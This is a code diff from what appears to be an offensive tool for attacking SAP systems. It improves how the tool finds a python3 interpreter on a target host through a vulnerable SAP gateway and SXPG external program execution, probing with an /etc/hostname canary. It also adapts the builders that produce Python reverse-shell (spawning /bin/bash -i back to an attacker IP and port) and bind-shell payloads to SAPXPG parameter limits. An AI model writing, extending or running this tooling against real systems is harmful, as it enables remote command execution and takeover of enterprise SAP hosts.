@@ -1607,17 +1607,64 @@ def _detect_is_windows(node, method: str = "sxpg",
 
 
 def _detect_python_cmd(node, soap_route: dict = None) -> str:
-    """Detect whether the target has python3 or python (2.x).
-    Caches result on node._python_cmd.
+    """Detect a usable python3 (or python 2.x) invocation spec on the target.
 
-    When ``soap_route`` is supplied AND the gateway is unreachable, the
-    probe runs over SOAP-RFC SXPG — required for HTTP-only Type-G/H
-    targets where pyrfc would hang for 60s per attempted command.
+    Returns a "spec" string that the payload builders split into
+    ``command`` + ``args_prefix`` via :func:`_split_python_spec`.  A
+    plain path or bare name (``"python3"``, ``"/usr/bin/python3"``)
+    has no args prefix; a HANA-shipped python3 comes back env-wrapped
+    (``"/usr/bin/env LD_LIBRARY_PATH=/hana/.../lib /hana/.../python3"``)
+    so the interpreter can find its own libpython under sapxpg's
+    stripped env.  Caches the resolved spec on ``node._python_cmd``.
+
+    When ``node.gw_vulnerable`` is set, we lean on the richer GW-based
+    probe from :mod:`sap_db_sql_writers` (``_probe_python3_via_gw``)
+    which tries a static candidate list AND enumerates HANA-shipped
+    python3 binaries — the same probe that finds
+    ``/hana/shared/HDB/exe/linuxx86_64/hdb/Python3/bin/python3`` on
+    S/4HANA appliances where ``/usr/bin/python3`` is absent.  This
+    also feeds the reverse/bind-shell payloads, which otherwise fail
+    with ``Can't exec external program (2)`` (ENOENT) when SXPG is
+    used against a hardened SUSE/appliance host.
     """
     cached = getattr(node, "_python_cmd", None)
     if cached:
         return cached
-    # Try python3 first via a quick GW, SXPG, or SOAP-RFC probe
+
+    # Preferred path: rich GW-based probe.  Works when the gateway is
+    # vulnerable AND the P3/P4 stdout capture channel is alive on this
+    # kernel — the probe self-tests that with an /etc/hostname canary.
+    if node.gw_vulnerable:
+        try:
+            from sap_db_sql_writers import _probe_python3_via_gw
+            host = node.ip or node.hostname
+            gw_port = 0
+            for inst in node.instances:
+                for p, svc in inst.ports.items():
+                    if svc == "gateway" or (isinstance(p, int)
+                                             and 3300 <= p <= 3399):
+                        gw_port = p
+                        break
+                if gw_port:
+                    break
+            gw_port = node.gw_vulnerable_port or gw_port
+            if host and gw_port:
+                instance_str = f"{gw_port - 3300:02d}"
+                hostname = node.hostname or host
+                kernel = node.kernel or "742"
+                spec = _probe_python3_via_gw(
+                    host, gw_port, instance_str, hostname,
+                    node.sid or "SAP", kernel, node.saprouter or "")
+                if spec:
+                    node._python_cmd = spec
+                    return spec
+        except Exception as e:
+            print(f"[!] {node.sid}: rich python3 probe failed "
+                  f"({e!r}) — falling back to --version probe")
+
+    # Fallback: --version probe over GW / SOAP-RFC / SXPG.  Only
+    # answers whether python3/python exists in PATH — no HANA-shipped
+    # fallback, no env-wrap.  Better than nothing when GW is blocked.
     for cmd in ("python3", "python"):
         try:
             if node.gw_vulnerable:
@@ -1641,6 +1688,7 @@ def _detect_python_cmd(node, soap_route: dict = None) -> str:
                 out = " ".join(result.get("output", [])).lower()
                 if ("no such file" in out or "not found" in out
                         or "not recognized" in out
+                        or "can't exec external program" in out
                         or "exit code 1" in out):
                     continue
                 node._python_cmd = cmd
@@ -1651,6 +1699,26 @@ def _detect_python_cmd(node, soap_route: dict = None) -> str:
     # Default to python3
     node._python_cmd = "python3"
     return "python3"
+
+
+def _split_python_spec(spec: str) -> tuple:
+    """Split a python3 spec (returned by :func:`_detect_python_cmd`)
+    into ``(command, args_prefix)`` for the payload builders.
+
+    A spec is either a bare path/name or an env-wrapped invocation:
+
+    - ``"python3"`` → ``("python3", "")``
+    - ``"/usr/bin/python3"`` → ``("/usr/bin/python3", "")``
+    - ``"/usr/bin/env LD_LIBRARY_PATH=/... /hana/.../python3"``
+      → ``("/usr/bin/env", "LD_LIBRARY_PATH=/... /hana/.../python3")``
+
+    Callers concatenate ``args_prefix`` in front of their own
+    python arguments (space-separated) when building PARAMS.
+    """
+    if not spec or " " not in spec:
+        return spec or "python3", ""
+    first_space = spec.find(" ")
+    return spec[:first_space], spec[first_space + 1:]
 
 
 def _perl_reverse_shell(ip: str, port: int, with_fork: bool = True) -> str:
@@ -1716,11 +1784,29 @@ def _generate_payload(os_type: str, ip: str, port: int,
             f"__import__('subprocess').call(['/bin/bash','-i'])"
         )
         assert " " not in py_code, f"Space in payload: {py_code}"
-        return {
-            "command": python_cmd,
-            "params": f"-c {py_code}",
-            "display": f"{python_cmd} reverse shell → {ip}:{port}",
-        }
+        # python_cmd may be an env-wrapped spec (HANA-shipped python3
+        # discovery returns "/usr/bin/env LD_LIBRARY_PATH=... /path").
+        # Split so the wrapper prefix rides in PARAMS/LONG_PARAMS and
+        # the top-level program (env or python3) is the EXTPROG.
+        cmd_head, args_prefix = _split_python_spec(python_cmd)
+        combined = (f"{args_prefix} -c {py_code}"
+                    if args_prefix else f"-c {py_code}")
+        # SAPXPG PARAMS caps at 255 bytes; anything longer must ride
+        # LONG_PARAMS.  HANA-wrapped invocations blow past 255 easily.
+        if len(combined) > 255:
+            payload = {
+                "command": cmd_head,
+                "params": "",
+                "long_params": combined,
+                "display": f"{python_cmd} reverse shell → {ip}:{port}",
+            }
+        else:
+            payload = {
+                "command": cmd_head,
+                "params": combined,
+                "display": f"{python_cmd} reverse shell → {ip}:{port}",
+            }
+        return payload
 
 
 def _generate_bind_payload(os_type: str, port: int,
@@ -1765,9 +1851,24 @@ def _generate_bind_payload(os_type: str, port: int,
         )
         assert " " not in py_code, f"Space in bind payload: {py_code}"
         assert len(py_code) < 252, f"Bind payload too long: {len(py_code)} chars"
+        # python_cmd may be an env-wrapped spec (HANA-shipped python3
+        # discovery returns "/usr/bin/env LD_LIBRARY_PATH=... /path").
+        # Split so the wrapper prefix rides in PARAMS/LONG_PARAMS and
+        # the top-level program (env or python3) is the EXTPROG.
+        cmd_head, args_prefix = _split_python_spec(python_cmd)
+        combined = (f"{args_prefix} -c {py_code}"
+                    if args_prefix else f"-c {py_code}")
+        # SAPXPG PARAMS caps at 255 bytes; overflow rides LONG_PARAMS.
+        if len(combined) > 255:
+            return {
+                "command": cmd_head,
+                "params": "",
+                "long_params": combined,
+                "display": f"{python_cmd} bind shell on target port {port}",
+            }
         return {
-            "command": python_cmd,
-            "params": f"-c {py_code}",
+            "command": cmd_head,
+            "params": combined,
             "display": f"{python_cmd} bind shell on target port {port}",
         }
 
